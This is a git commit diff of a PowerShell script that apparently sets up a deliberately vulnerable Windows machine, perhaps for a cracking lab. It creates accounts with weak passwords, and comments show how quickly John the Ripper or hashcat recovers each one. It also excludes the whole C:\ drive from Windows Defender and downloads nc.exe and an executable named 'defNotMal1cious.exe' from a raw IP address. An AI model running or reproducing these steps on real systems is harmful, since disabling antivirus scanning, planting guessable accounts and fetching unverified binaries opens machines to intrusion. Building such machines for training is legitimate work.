b9d22c535a740d6a3965ddc13ddd7697b1af9a1f
soupsamich <66322946+soupsamich@users.noreply.github.com>
2020-06-29 02:48:51 -0400

    Update windowsScript.ps1

--- windowsScript.ps1
+++ windowsScript.ps1
@@ -4,10 +4,9 @@ secedit /configure /db c:\windows\security\local.sdb /cfg c:\secpol.cfg /areas S
 rm -force c:\secpol.cfg -confirm:$false
 net user julie Juliet /ADD #Takes a few seconds with "john --wordlist=/usr/share/john/password.lst --rules:All hash.txt" *OR*
 #Takes about a minute with "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"
-net user falcon ypmutS /ADD #Takes a few seconds with "john --wordlist=/usr/share/john/password.lst --rules:All hash.txt"
-net user yvonne Any1 /ADD # Quick brute force, no mask necessary, or ?a?a?a?a, or ?u?l?l?d
-net user madison hockey /ADD #Instant with "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"
-net user callie Hacker! /ADD #A few minutes with hashcat -m 1000 -a 3 and mask ?u?l?l?l?l?l?a
+net user julie prettywoman /ADD # 1,000 lines into rockyou
+net user yvonne hallowell /ADD # - end of password.lst
+net user joshua Nabdawr23 /ADD # - ?u?l?l?l?l?l?l?d?d
 Add-MpPreference -ExclusionPath "C:\";
 Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/nc.exe -OutFile C:/nc.exe;
 Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/defNotMal1cious.exe -OutFile C:/defNotMal1cious.exe;
